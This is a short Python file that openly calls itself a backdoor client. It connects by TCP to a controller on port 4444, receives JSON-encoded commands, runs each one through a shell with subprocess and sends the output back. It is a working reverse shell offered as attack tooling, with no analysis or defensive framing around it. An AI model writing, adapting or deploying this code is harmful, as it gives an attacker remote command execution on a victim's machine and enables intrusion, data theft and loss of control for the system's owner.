import socket, json # connect to server
import subprocess

server_host = "localhost" # 192.168.0.81
server_port = 4444

class BackdoorClient:
    def __init__(self, server_host, server_port):
        # starts client and sets variables
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((server_host, server_port))

        self.server_host = server_host
        self.server_port = server_port

        print(f"Connected to {self.server_host}:{self.server_port}")

    def json_send(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)
    
    def json_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_order(self, command):
        return subprocess.check_output(command, shell=True).decode('utf-8')
    
    def run(self):
        while True:
            command = self.json_recieve()
            command_output = self.execute_order(command)
            self.json_send(command_output)

# Creating and running the client
client = BackdoorClient(server_host, server_port)
client.run()
